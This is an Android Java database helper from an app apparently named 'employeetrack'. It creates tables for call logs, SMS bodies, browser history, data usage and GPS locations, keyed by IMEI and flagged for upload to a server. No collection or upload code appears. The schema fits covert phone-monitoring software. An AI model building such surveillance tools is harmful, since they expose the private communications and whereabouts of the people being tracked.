 package my.employeetrack.app;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteDatabase.CursorFactory;
import android.database.sqlite.SQLiteOpenHelper;

public class DbHelper extends SQLiteOpenHelper 
{
	public DbHelper(Context context, String name, CursorFactory factory)
	{
		super(context, name, factory, 3);
		// TODO Auto-generated constructor stub
	}
	@Override
	public void onCreate(SQLiteDatabase db)
	{
		db.execSQL("create table calllog(_id Integer,imei long,number text,dat long,time long,duration long,type text,updateServer Integer)");
		db.execSQL("create table smslog(" +
				"_id Integer," +
				"thread_id Integer," +
				"imei long," +
				"address text," +
				"date date," +
				"read Integer," +
				"status Integer," +
				"type Integer," +
				"body text," +
				"seen Integer," +
				"updateServer Integer" +
				")"
				);
		db.execSQL("create table BrowserInfo(id Integer,created long,date long,title text,url text,visits Integer,updateServer Integer)");
		db.execSQL("create table WebDetail(date long,imei long,receive long,transfer long,updateServer Integer)");
		db.execSQL("create table GPSLocal(date long,imei long,longitude double,latitude double,updateServer Integer)");
		db.execSQL("create table GPSServer(longitude double,latitude double)");

	}
	public void onUpgrade(SQLiteDatabase arg0, int arg1, int arg2) 
	{
	
	}

}
